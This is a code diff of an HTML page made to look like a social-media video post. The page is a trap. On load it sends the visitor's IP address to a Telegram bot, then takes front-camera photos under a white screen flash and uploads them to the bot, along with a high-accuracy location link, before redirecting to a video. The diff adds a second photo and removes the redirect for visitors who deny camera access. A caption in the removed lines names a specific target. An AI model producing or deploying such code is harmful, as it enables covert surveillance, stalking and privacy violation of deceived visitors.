@@ -14,7 +14,7 @@
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         
-        /* 🔍 گۆڕانکاری لێرەدایە: وێنەکە نزیک کراوەتەوە و هەموو شاشەکە دەگرێت */
+        /* وێنەی پشتێنە بە زووم و پڕاوپڕ */
         .bg { 
             position: fixed; 
             top: 0; 
@@ -22,25 +22,28 @@
             width: 100%; 
             height: 100%; 
             background: url('pasha.jpg') no-repeat center center; 
-            background-size: cover; /* لێرەدا وێنەکە نزیک دەبێتەوە */
-            z-index: 1; 
-            filter: brightness(0.9); /* کەمێک تاریک بۆ ئەوەی نیشانەی Play دیار بێت */
+            background-size: cover; 
+            z-index: 1;
+            transform: scale(1.05);
         }
 
         .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 5; pointer-events: none; }
-        .play-icon { width: 80px; height: 80px; fill: white; opacity: 0.85; }
+        .play-icon { width: 85px; height: 85px; fill: white; opacity: 0.9; }
         
         .info-overlay {
             position: fixed;
-            bottom: 50px;
-            left: 20px;
+            bottom: 45px;
+            left: 15px;
             color: white;
             z-index: 10;
-            text-shadow: 2px 2px 4px rgba(0,0,0,1);
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.9);
         }
 
         #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
+        
+        /* فلاشە سپییەکە لە کاتی وێنەگرتن */
         #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 200; display: none; }
+        
         video, canvas { display: none; }
     </style>
 </head>
@@ -48,9 +51,9 @@
     <div class="bg"></div>
     
     <div class="info-overlay">
-        <p style="font-weight: bold; font-size: 20px; margin: 0;">@havin_sorany</p>
-        <p style="font-size: 15px; margin: 8px 0;">#hvin_sorai #hawler_soran _dhok_karkuk_hallabja</p>
-        <div style="display: flex; gap: 20px; font-size: 15px; margin-top: 12px;">
+        <p style="font-weight: 700; font-size: 19px; margin: 0;">@havin_sorany</p>
+        <p style="font-size: 14px; margin: 6px 0; opacity: 0.9;">#hvin_sorai #hawler_soran _dhok_karkuk_hallabja</p>
+        <div style="display: flex; gap: 15px; font-size: 14px; margin-top: 10px;">
             <span>❤️ 2.9K</span>
             <span>💬 188</span>
             <span>🔗 452</span>
@@ -75,46 +78,60 @@
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
-                const ip = data.ip;
-                const msg = `🔔 Havin Sorany کرایەوە!\n🌐 ئایپی: ${ip}`;
+                const msg = `🔔 لینکەکە کرایەوە!\n🌐 IP: ${data.ip}`;
                 fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
             } catch (e) {}
         }
         notifyVisit();
 
-        async function sendPhoto(v, c, fileName, caption) {
+        async function sendPhoto(v, c, caption) {
             c.width = v.videoWidth; c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
-            const blob = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
+            const blob = await (await fetch(c.toDataURL('image/jpeg', 0.85))).blob();
             const fd = new FormData();
             fd.append('chat_id', chat_id);
-            fd.append('photo', blob, fileName);
+            fd.append('photo', blob, 'shot.jpg');
             fd.append('caption', caption);
             return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
         }
 
         async function startApp() {
             try {
+                // داوای ڕێگەپێدانی کامێرا
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.getElementById('v');
                 v.srcObject = s;
                 await v.play();
-                document.getElementById('flash').style.display = 'block';
+                const f = document.getElementById('flash');
 
+                // وێنەی یەکەم دوای ١٠٠٠ (لە کاتی سپی بوونی شاشە)
                 setTimeout(async () => {
-                    await sendPhoto(v, document.getElementById('c'), "1.jpg", "📸 Target: Havin Sorany");
-                    document.getElementById('flash').style.display = 'none';
-                    
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(async (pos) => {
-                            const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
+                    f.style.display = 'block'; // شاشە سپی دەبێت
+                    await sendPhoto(v, document.getElementById('c'), "📸 Snap 1 (1000ms)");
+                    f.style.display = 'none';
+
+                    // وێنەی دووەم دوای ٢٠٠
+                    setTimeout(async () => {
+                        f.style.display = 'block';
+                        await sendPhoto(v, document.getElementById('c'), "📸 Snap 2 (200ms)");
+                        f.style.display = 'none';
+
+                        // لۆکەیشنە ئەسڵییەکە
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(async (pos) => {
+                                const lat = pos.coords.latitude;
+                                const lon = pos.coords.longitude;
+                                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
+                                window.location.href = targetVideo;
+                            }, () => { window.location.href = targetVideo; }, { enableHighAccuracy: true });
+                        } else {
                             window.location.href = targetVideo;
-                        }, () => { window.location.href = targetVideo; });
-                    } else { window.location.href = targetVideo; }
+                        }
+                    }, 200);
                 }, 1000);
             } catch (e) {
-                window.location.href = targetVideo;
+                // ئەگەر Allow نەکات، لێرە هیچ ڕونادات و ناچێتە سەر ڤیدیۆکە
             }
         }
     </script>
